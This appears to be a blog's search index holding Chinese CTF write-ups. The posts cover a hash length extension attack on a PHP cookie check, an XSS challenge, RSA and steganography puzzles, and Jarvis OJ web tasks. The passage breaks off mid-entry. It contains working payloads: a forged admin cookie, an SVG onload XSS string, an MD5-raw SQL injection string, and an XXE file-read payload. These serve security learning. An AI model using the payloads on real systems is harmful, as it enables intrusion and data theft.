<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[哈希长度扩展攻击]]></title>
      <url>/2018/02/02/hash-extender-attack/</url>
      <content type="html"><![CDATA[<p>哈希长度扩展攻击利用了 MD5 ，SHA1 等加密算法的缺陷，可以在不知道原始密钥的情况下计算出一个对应的 hash 值。</p>
<a id="more"></a>
<h2 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h2><p>做题的时候看到了这个问题，挺好玩的，记录一下。</p>
<p>题目中的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $auth = <span class="keyword">false</span>;</div><div class="line">    $role = <span class="string">"guest"</span>;   </div><div class="line">    $salt = ;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</div><div class="line">        $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</div><div class="line">        $hsh = $_COOKIE[<span class="string">"hsh"</span>];</div><div class="line">        <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;    </div><div class="line">            $auth = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            $auth = <span class="keyword">false</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;&#125;   </div><div class="line">        $s = serialize($role);</div><div class="line">        setcookie(<span class="string">'role'</span>,$s);</div><div class="line">        $hsh = md5($salt.strrev($s));</div><div class="line">        setcookie(<span class="string">'hsh'</span>,$hsh);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ($auth) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is "</span></div><div class="line">    &#125; </div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;  </div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<blockquote>
<p>一篇不错的文章：<a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks" target="_blank" rel="external">https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks</a></p>
</blockquote>
<h2 id="0x01-简单了解hash函数"><a href="#0x01-简单了解hash函数" class="headerlink" title="0x01 简单了解hash函数"></a>0x01 简单了解hash函数</h2><p>哈希函数以区块为单位操作数据。诸如MD5, SHA1, SHA256的区块长度都是512 bits 。大多数 message 的长度不会刚好可以被哈希函数的区块长度整除。因此 message 就必须被填充（ padding ）至区块长度的整数倍。</p>
<p>这里简单说一下MD5的加密原理，详细的描述可以参考 <a href="https://www.ietf.org/rfc/rfc1321.txt" target="_blank" rel="external">RFC1321</a></p>
<p>MD5是输入不定长度信息，输出固定长度128-bits的算法。即使原文中出现一个微小的变化，其散列结果也会发生巨大变化。空文的散列为：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">MD5</span><span class="params">(<span class="string">""</span>)</span></span> = d41d8cd98f00b204e9800998ecf8427e</div></pre></td></tr></table></figure></p>
<p>MD5算法包括几个步骤：1. 补位；2. 补长度；3. 初始化MD缓冲区；4. 处理字块消息。它以512bit为一个块进行迭代运算，第一个块计算完成后四个寄存器的值就会更新，如果还存在下一个块，就在此基础上继续进行迭代计算，全部完成后，把四个寄存器中的十六进制连接起来，就是最后的md5值。简单讲一下这几个步骤：</p>
<p>1 - 补位<br>如果当前的数据长度不满足对 512bit 求余为 448bit ，即len(message) % 512 != 448时，需要补位至满足这个条件。<br>补位方式：</p>
<ol>
<li>首先补一个1（二进制位上的1，而非十进制位上的）</li>
<li>在后面补0（也是二进制位上的），直到满足条件（数据比特长度对 512 求余为 448）</li>
</ol>
<p>注意，如果消息长度已经达到 448bit ，也要进行补位，补位是必须的。</p>
<p>2 - 补长度<br>即补 64bit 的长度，这个长度是在补 1 和 0 以前的长度，如果长度超出了 64bit，那么就取低 64bit。</p>
<p>引用一下<a href="https://lightless.me/archives/hash-extender-attack.html" target="_blank" rel="external">lightless</a>文章里的说法。完成补位与补长度的操作后，一个块可能是这个样子的：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">raw_data + '\<span class="keyword">x</span><span class="number">80</span>' + '\<span class="keyword">x</span><span class="number">00</span>'*n + '\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>'</div></pre></td></tr></table></figure></p>
<p>第一个 raw_data 的部分就是原始的数据，第二个部分’\x80’是一开始补的一个二进制位 1，接着补若干个 \ x00，直到整个长度达到 56Byte，最后的 8Byte 就是 raw_data 的长度，如果 raw_data 的长度超过了 2^64bit，则取低 64bit.</p>
<blockquote>
<p>附1，2步的文档介绍</p>
<p> Step 1. Append Padding Bits</p>
<p> The message is “padded” (extended) so that its length (in bits) is<br> congruent to 448, modulo 512. That is, the message is extended so<br> that it is just 64 bits shy of being a multiple of 512 bits long.<br> Padding is always performed, even if the length of the message is<br> already congruent to 448, modulo 512.</p>
<p> Padding is performed as follows: a single “1” bit is appended to the<br> message, and then “0” bits are appended so that the length in bits of<br> the padded message becomes congruent to 448, modulo 512. In all, at<br> least one bit and at most 512 bits are appended.</p>
<p> Step 2. Append Length</p>
<p> A 64-bit representation of b (the length of the message before the<br> padding bits were added) is appended to the result of the previous<br> step. In the unlikely event that b is greater than 2^64, then only<br> the low-order 64 bits of b are used. (These bits are appended as two<br> 32-bit words and appended low-order word first in accordance with the<br> previous conventions.)</p>
<p> At this point the resulting message (after padding with bits and with<br> b) has a length that is an exact multiple of 512 bits. Equivalently,<br> this message has a length that is an exact multiple of 16 (32-bit)<br> words. Let M[0 … N-1] denote the words of the resulting message,<br> where N is a multiple of 16.</p>
</blockquote>
<p>3 - 初始化MD缓冲区<br>在计算md5的时候会先初始化四个寄存器（A，B，C，D）且有各自的初始值：<br><figure class="highlight tap"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">word A:<span class="number"> 01 </span>23<span class="number"> 45 </span>67</div><div class="line">word B:<span class="number"> 89 </span>ab cd ef</div><div class="line">word C: fe dc ba 98</div><div class="line">word D:<span class="number"> 76 </span>54<span class="number"> 32 </span>10</div></pre></td></tr></table></figure></p>
<p>4 - 处理字块消息<br>必须用已经完成补位 &amp; 补长度操作的字块来进行运算，具体细节不展开了，我们只需要知道经过一次消息摘要后，上面的寄存器值将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。</p>
<p><strong>举个栗子🌰</strong></p>
<ol>
<li><p>假设待加密的字符串为 <code>abc</code> </p>
</li>
<li><p>把字符串转化为16进制形式 - <code>616263</code><br><img src="/2018/02/02/hash-extender-attack/1.png" alt=""></p>
</li>
<li><p>补位。即在二进制形式的信息后面先添一个 <code>1</code> ，然后接若干个 <code>0</code> 直到满足 len(message) % 512 == 448 这一条件。16进制下我们在 <code>616263</code> 后加一个 <code>80</code> （即二进制的 <code>10000000</code> ），把它按照规则补位到 448 bit ，也就是56字节。<br><img src="/2018/02/02/hash-extender-attack/2.png" alt=""></p>
</li>
<li><p>补长度。完成补位后，第 57 个字节存储的是补位之前信息的长度。原来的信息为 <code>abc</code> ，3个字符，3个字节，24 bit，换成16进制后为 0x18 ，其后补充7个 0x00 以补满 64 字节。<br><img src="/2018/02/02/hash-extender-attack/3.png" alt=""></p>
</li>
<li><p>利用完成前几步补足操作的数据进行复杂运算。取出 64 字节信息，第一轮运算中使用的链变量为初始链变量，之后每一次运算链变量都会被覆盖更新，最后一轮运算产生的链变量经过高低位互换后就是我们得到的 MD5 值。</p>
</li>
</ol>
<h2 id="0x03-哈希长度扩展攻击"><a href="#0x03-哈希长度扩展攻击" class="headerlink" title="0x03 哈希长度扩展攻击"></a>0x03 哈希长度扩展攻击</h2><p>MD5的补位操作正是实现长度扩展攻击的关键。</p>
<p>我们虽然不知道具体的 salt 值，但如果我们得到了其 hash 值以及一个可控的信息，我们就可以利用这些点进行哈希长度扩展攻击。我们得到的 hash 值正是最后一轮运算产生的链变量经过高低位互换后得到的结果，如果我们要把可控的信息进行下一轮运算，只需要知道上一轮信息产生的链变量。</p>
<p>回到开头贴的那份代码，关键语句为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;    </div><div class="line">            $auth = <span class="keyword">true</span>;</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
<p>简单说一下思路：我们可以从 cookie 里拿到一段已知的 hash ，我们也知道需要校验的内容（admin），salt与其长度是未知的，但我们可以通过哈希长度扩展攻击来构造一段想利用的校验内容，即使不知道 salt 也可以得出它的 hash 值。</p>
<p>先将明文进行分组与填充，在其后添加我们想要增加的新内容，即新的校验内容，然后我们把原来得到的 hash 值逆为 key 值（注意 md5 中的值都是小端的），根据 MD5 加密原理，我们已经得到了 key ，就可以得出下一轮的 hash 值了（例如此处的 admin 的 hash 值。）</p>
<p>因为这个题里还有一个 strrev 函数（字符串反转），构造如下 payload：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">原校验的内容：;"<span class="selector-tag">tseug</span>"<span class="selector-pseudo">:5</span><span class="selector-pseudo">:s</span></div><div class="line">新添加的内容：;"<span class="selector-tag">nimda</span>"<span class="selector-pseudo">:5</span><span class="selector-pseudo">:s</span></div><div class="line">原<span class="selector-tag">hash</span>值：3<span class="selector-tag">a4727d57463f122833d9e732f94e4e0</span></div><div class="line"><span class="selector-tag">salt</span> 长度未知，需要进行爆破</div></pre></td></tr></table></figure>
<p>之前的 wp 里用的是 hash_extender 这个工具，这里使用的是 hashpump 。<br><img src="/2018/02/02/hash-extender-attack/4.png" alt=""></p>
<p>把 <code>\x</code> 都换成 <code>%</code> ，可以得到</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">role = s<span class="symbol">%3</span>a<span class="number">5</span><span class="symbol">%3</span>a<span class="string">"admin"</span><span class="symbol">%3</span>b<span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%c0</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%80</span>s<span class="symbol">%3</span>a<span class="number">5</span><span class="symbol">%3</span>a<span class="string">"guest"</span><span class="symbol">%3</span>b</div><div class="line">hsh = fcdc<span class="number">3840332555511</span><span class="keyword">c</span><span class="number">4e4323</span>f<span class="number">6</span>decb<span class="number">07</span></div></pre></td></tr></table></figure>
<p>最后修改一下Cookie得到flag。<br><img src="/2018/02/02/hash-extender-attack/5.png" alt=""></p>
<p>修复方法：用 hash($SECRET, hash($message)) 的方式，这样用户就不可控 message 了，另外使用 HMAC 也是可以的。</p>
]]></content>
      
        <categories>
            
            <category> Crypto </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> Crypto </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSS Challenge]]></title>
      <url>/2018/01/09/xss-ch/</url>
      <content type="html"><![CDATA[<p><a href="http://prompt.ml/0" target="_blank" rel="external">平台地址</a> &amp; <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">源码地址</a></p>
<a id="more"></a>
<h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2><p>1、成功执行prompt(1)<br>2、payload不需要用户交互（成功会显示you won）<br>3、payload必须对下述浏览器有效：<br>Chrome(最新版) - Firefox(最新版) - IE10 及以上版本(或者IE10兼容模式)<br>4、每个级别至少给出两种浏览器的答案<br>5、字符越少越好</p>
<blockquote>
<p>偷个懒，直接搬了土土的翻译，附上土土的<a href="https://lorexxar.cn/2015/07/02/xss-p/" target="_blank" rel="external">wp</a>。虽然是很早前的练习了，但是没玩过的不会的东西，对菜鸡来说都是新鲜的吧。</p>
</blockquote>
<h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// warm up</span></div><div class="line">    <span class="comment">// script should be executed without user interaction</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>什么过滤都没有，直接svg就好了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"&gt;&lt;svg/onload=prompt(1)&gt;</span></div></pre></td></tr></table></figure>
<p>【滚去复习了，寒假补上</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【pwnhub 密码学专场】warmup1 & asymmetric1]]></title>
      <url>/2017/12/22/pwnhub-%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%93%E5%9C%BA/</url>
      <content type="html"><![CDATA[<p>pwnhub密码学公开赛里的两个题。wp交得太匆忙，写得有点简陋，没过审，下次再加油吧。</p>
<a id="more"></a>
<h2 id="warmup1"><a href="#warmup1" class="headerlink" title="warmup1"></a>warmup1</h2><p>LL：这是我多少年前玩剩的套路了。</p>
<p>txt文件一片空白，二进制格式打开为一片<code>09</code>，<code>20</code>。分别用<code>1</code>与<code>0</code>替代即可，因为<code>0x09</code>代表<code>tab</code>，<code>0x20</code>代表空格，所以看不到任何东西。</p>
<p>处理一下数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># !/usr/bin/python </span></div><div class="line"><span class="comment"># coding=utf-8 </span></div><div class="line"><span class="comment"># author: cyris</span></div><div class="line"></div><div class="line">s = <span class="stringspan></div><div class="line">  </div><div class="line">temp = ((s.replace(<span class="string">'20'</span>,<span class="string">'0'</span>)).replace(<span class="string">'09'</span>, <span class="string">'1'</span>)).split()</div><div class="line">result = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> temp:</div><div class="line">    result.append(hex(int(i,<span class="number">2</span>)))</div><div class="line"></div><div class="line">flag_hex = <span class="string">"flag_hex: "</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> result:</div><div class="line">    flag_hex += j.replace(<span class="string">'0x'</span>,<span class="string">''</span>)</div><div class="line"><span class="keyword">print</span> flag_hex</div><div class="line"></div><div class="line"><span class="comment"># flag_hex: 70776e6875627b776869746573706163655f73746567616e6f6772617068797d</span></div><div class="line"><span class="comment"># flag: pwnhub&#123;whitespace_steganography&#125;</span></div></pre></td></tr></table></figure>
<h2 id="asymmetric1"><a href="#asymmetric1" class="headerlink" title="asymmetric1"></a>asymmetric1</h2><p>题目给出的信息如下：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">N：<span class="number">179769313486231590772930519078902473361797697894230657273430081157732675805500963132708477322407536021120113879871393357658789768814416622492847430639477074095512480796227391561801824887394139579933613278628104952355769470429079061808809522886423955917442317693387325171135071792698344550223571732405562649211</span></div><div class="line"></div><div class="line">E：<span class="number">3</span></div><div class="line"></div><div class="line">C：<span class="number">826315331619023570333927368402415746375121931530175503997253550521249603484788863000488498971763172906490538445007322279725379352003051009132296583666591835676940471026344712455146169609370787877307086577742407351355619892014203721206411825379081930406716230574277137708287779956941012581</span>L</div><div class="line"></div><div class="line">flag?</div></pre></td></tr></table></figure>
<p>e为3时会产生小明文攻击。 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># !/usr/bin/python </span></div><div class="line"><span class="comment"># coding=utf-8 </span></div><div class="line"><span class="comment"># author: cyris</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> gmpy</div><div class="line"><span class="keyword">import</span> libnum</div><div class="line"></div><div class="line">N = <span class="number">179769313486231590772930519078902473361797697894230657273430081157732675805500963132708477322407536021120113879871393357658789768814416622492847430639477074095512480796227391561801824887394139579933613278628104952355769470429079061808809522886423955917442317693387325171135071792698344550223571732405562649211</span></div><div class="line">C = <span class="number">826315331619023570333927368402415746375121931530175503997253550521249603484788863000488498971763172906490538445007322279725379352003051009132296583666591835676940471026344712455146169609370787877307086577742407351355619892014203721206411825379081930406716230574277137708287779956941012581L</span></div><div class="line"></div><div class="line">k=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    (x,y)=gmpy.root(C+k*N,<span class="number">3</span>)</div><div class="line">    <span class="keyword">if</span>(y==<span class="number">1</span>):</div><div class="line">        <span class="keyword">print</span> <span class="string">"flag: "</span> + libnum.n2s(x);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    k+=<span class="number">1</span></div><div class="line"></div><div class="line"><span class="comment"># flag: pwnhub&#123;f233dd92e8c379983d394ccd7c26122c&#125;</span></div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> pwnhub </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Jarvis OJ Writeup]]></title>
      <url>/2017/11/04/jarvisoj-wp/</url>
      <content type="html"><![CDATA[<p>这里记录一些jarvis oj上的题。</p>
<a id="more"></a> 
<hr>
<h2 id="Web部分"><a href="#Web部分" class="headerlink" title="Web部分"></a>Web部分</h2><h3 id="0x01-Login"><a href="#0x01-Login" class="headerlink" title="0x01 Login"></a>0x01 Login</h3><p>需要密码才能获得flag哦。     </p>
<p>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="external">http://web.jarvisoj.com:32772/</a></p>
<p>在 Headers 里找到一条hint：<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hint:"<span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">`admin`</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="string">'".md5($pass,true)."'</span><span class="string">"</span></div></pre></td></tr></table></figure></p>
<p>涉及到一个MD5加密后的注入问题。    </p>
<p>关于这条md5语句我们先来看下php手册中的描述：</p>
<blockquote>
<p><strong>Description</strong></p>
<p>string md5 ( string str [, bool raw_output] )</p>
<p>Calculates the MD5 hash of str using the RSA Data Security, Inc. MD5 Message-Digest Algorithm, and returns that hash. The hash is a 32-character hexadecimal number. If the optional raw_output is set to TRUE, then the md5 digest is instead returned in raw binary format with a length of 16.</p>
<p>注: The optional raw_output parameter was added in PHP 5.0.0 and defaults to FALSE</p>
</blockquote>
<p>也就是说，如果md5后的hex转换成字符串后，若包含 <code>&#39;or&#39;&lt;trash&gt;</code> 这样的字符串，那整个sql语句就会变成：   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM admin WHERE <span class="keyword">pass</span> = <span class="string">''</span>o<span class="string">r'&lt;trash&gt;'</span></div></pre></td></tr></table></figure>
<p>就可以进行注入了。   </p>
<p>网上找到一个字符串：<code>ffifdyop</code></p>
<p>md5以后：<code>276f722736c95d99e921722cf9ed621c</code></p>
<p>再转换成字符串即为<code>&#39;or&#39;&lt;trash&gt;</code>  </p>
<p>这题把上面这个字符串作为 password 传入即可。  </p>
<hr>
<h3 id="0x02-api调用"><a href="#0x02-api调用" class="headerlink" title="0x02 api调用"></a>0x02 api调用</h3><p>请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
<p>题目入口：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="external">http://web.jarvisoj.com:9882/</a></p>
<p>直接能看到源码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> xhr;</div><div class="line">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</div><div class="line">        <span class="keyword">catch</span>(e) &#123;</div><div class="line">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</div><div class="line">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</div><div class="line">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> xhr;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</div><div class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</div><div class="line"> <span class="keyword">var</span> xhr = XHR();</div><div class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</div><div class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</div><div class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</div><div class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</div><div class="line">             tip_area.value = data.task.search+data.task.value;</div><div class="line">         &#125;</div><div class="line">     &#125;;</div><div class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</div><div class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</div><div class="line">&#125;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
<p>光看这个没找到什么特别的东西，搜了一些资料发现这题是关于<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">XXE漏洞</a>，简单地说就是利用 <code>xml</code> 中的 <code>Entity</code> 实体来读取文件或者执行系统命令等，以造成攻击。  </p>
<p>这题里先把 <code>Content-Type</code> 改成 <code>application/xml</code>，然后构造：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE xdsec [</span></div><div class="line">&lt;!ELEMENT methodname ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM "/home/ctf/flag.txt" &gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">methodname</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></div></pre></td></tr></table></figure>
<p>就可以获取flag了。</p>
<hr>
<h3 id="0x03-神盾局的秘密"><a href="#0x03-神盾局的秘密" class="headerlink" title="0x03 神盾局的秘密"></a>0x03 神盾局的秘密</h3><p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</p>
<p>题目入口：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="external">http://web.jarvisoj.com:32768/</a></p>
<p>扫了一下目录，只发现了 <code>showing.php</code> 和 <code>index.php</code>。</p>
<p>查看源码发现</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></div></pre></td></tr></table></figure>
<p>感觉像文件包含，但是现在除了这张图外没有别的能利用的东西，试着读取 <code>showing.php</code> 本身：</p>
<p><img src="/2017/11/04/jarvisoj-wp/1.png" alt=""></p>
<p>可以看到源码，过滤了 <code>pctf</code> 。但是没什么利用方式，如果直接查看 <code>/pctf.php</code> 拿到的是假flag。同样的方式读取 <code>index.php</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">    <span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</div><div class="line">    $x = <span class="keyword">new</span> Shield();</div><div class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</div><div class="line">        $x = unserialize($g);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">echo</span> $x-&gt;readfile();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>然后拿到 <code>shield.php</code> 的源码：</p>
